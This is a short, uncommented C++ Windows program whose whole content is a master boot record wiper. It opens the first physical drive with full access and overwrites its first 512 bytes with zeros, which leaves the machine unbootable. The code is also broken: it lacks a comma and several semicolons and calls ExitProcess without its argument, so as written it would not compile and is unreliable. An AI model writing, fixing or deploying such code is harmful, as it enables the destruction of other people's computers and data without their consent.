#include <Windows.h>
using namespace std;
#define MBR_SIZE 512

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow) {
    HWND hide;
    DWORD write;
    char mbrData[MBR_SIZE]; 
    ZeroMemory(&mbrData, sizeof(mbrData));

    HANDLE MasterBootRecord = CreateFile("\\\\.\\PhysicalDrive0"
    GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE,
     NULL, OPEN_EXISTING, NULL, NULL)


    try {
        WriteFile(MasterBootRecord, mbrData, MBR_SIZE, &write, NULL)
        Sleep(5000);
        ExitProcess();
    } catch(...){}
    CloseHandle(MasterBootRecord);
    return EXIT_FAILURE;

}
